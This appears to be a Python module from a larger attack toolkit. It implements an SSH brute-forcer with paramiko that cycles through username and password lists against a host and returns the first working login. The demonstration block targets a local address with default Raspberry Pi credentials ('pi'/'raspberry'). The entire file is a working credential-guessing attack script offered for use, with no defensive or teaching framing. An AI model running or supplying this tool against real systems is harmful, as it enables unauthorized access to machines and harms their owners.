import paramiko
from core.logger import log_event

class SSHBruter:
    def __init__(self, hostname, port, usernames, passwords):
        self.hostname = hostname
        self.port = port
        self.usernames = usernames
        self.passwords = passwords
        self.found = []

    def try_ssh(self, username, password):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(self.hostname, port=self.port, username=username, password=password, timeout=5)
            client.close()
            return True
        except:
            return False

    def run(self):
        for user in self.usernames:
            for pwd in self.passwords:
                log_event("ssh_brute_try", {"username": user, "password": pwd})
                if self.try_ssh(user, pwd):
                    log_event("ssh_brute_success", {"username": user, "password": pwd}, level="info")
                    self.found.append({"user": user, "pass": pwd})
                    return self.found
        return self.found

if __name__ == "__main__":
    usernames = ["pi", "root"]
    passwords = ["raspberry", "admin"]
    bruter = SSHBruter("192.168.0.10", 22, usernames, passwords)
    print(bruter.run())
